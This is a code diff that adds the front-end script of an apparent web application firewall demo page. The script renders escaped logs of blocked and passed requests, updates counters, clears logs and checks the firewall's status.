+            logList.appendChild(logEmpty.cloneNode(true));
+            logStats = { blocked: 0, attack: 0, passed: 0 };
+            updateStats();
+            return;
+        }
+
+        logStats = { blocked: 0, attack: 0, passed: 0 };
+        let html = '';
+
+        // Reverse to show newest first
+        for (let i = logs.length - 1; i >= 0; i--) {
+            const log = logs[i];
+            let type, badge;
+
+            if (log.result.blocked) {
+                type = 'blocked';
+                badge = 'BLOCKED';
+                logStats.blocked++;
+            } else {
+                type = 'passed';
+                badge = 'PASSED';
+                logStats.passed++;
+            }
+
+            html += `
+                <div class="log-entry ${type}">
+                    <div class="log-entry-header">
+                        <span class="log-entry-badge">${badge}</span>
+                        <span class="log-entry-time">${escapeHtml(log.timestamp)}</span>
+                    </div>
+                    <div class="log-entry-detail">
+                        ${escapeHtml(log.method)} ${escapeHtml(log.path)}<br>
+                        Input: ${escapeHtml(log.input)}
+                    </div>
+                    ${log.result.blocked ? `<div class="log-entry-rule">Rule: ${escapeHtml(log.result.ruleName)} | ${escapeHtml(log.result.category)} | Match: ${escapeHtml(log.result.matchedPart)}</div>` : ''}
+                </div>`;
+        }
+
+        logList.innerHTML = html;
+        updateStats();
+    }
+
+    function updateStats() {
+        document.getElementById('statBlocked').textContent = logStats.blocked;
+        document.getElementById('statAttack').textContent = logStats.attack;
+        document.getElementById('statPassed').textContent = logStats.passed;
+    }
+
+    async function clearLogs() {
+        await fetch('/api/waf/logs/clear', { method: 'POST' });
+        refreshLogs();
+    }
+
+    // Enter key support
+    document.querySelectorAll('input').forEach(input => {
+        input.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter') {
+                const btn = input.closest('.attack-body').querySelector('.btn-send');
+                if (btn) btn.click();
+            }
+        });
+    });
+
+    // Initial status check
+    fetch('/api/waf/status').then(r => r.json()).then(d => updateWAFStatus(d.enabled));
+    refreshLogs();
+</script>
+
+</body>
+</html>
